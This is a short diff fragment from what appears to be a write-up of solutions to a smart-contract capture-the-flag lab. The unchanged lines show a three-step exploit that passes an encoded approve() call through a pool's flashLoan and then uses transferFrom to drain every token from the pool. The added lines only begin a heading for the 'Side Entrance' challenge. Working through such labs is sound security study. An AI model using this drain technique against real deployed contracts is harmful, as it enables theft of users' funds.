@@ -36,4 +36,9 @@ let interface = new ethers.utils.Interface(["function approve(address spender, u
 let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
 await pool.connect(player).flashLoan(0, player.address, token.address, data);
 await token.connect(player).transferFrom(pool.address, player.address,  TOKENS_IN_POOL);
+````
+
+#Fix #4: [Challenge #4 - Side Entrance]
+
+```
 ```
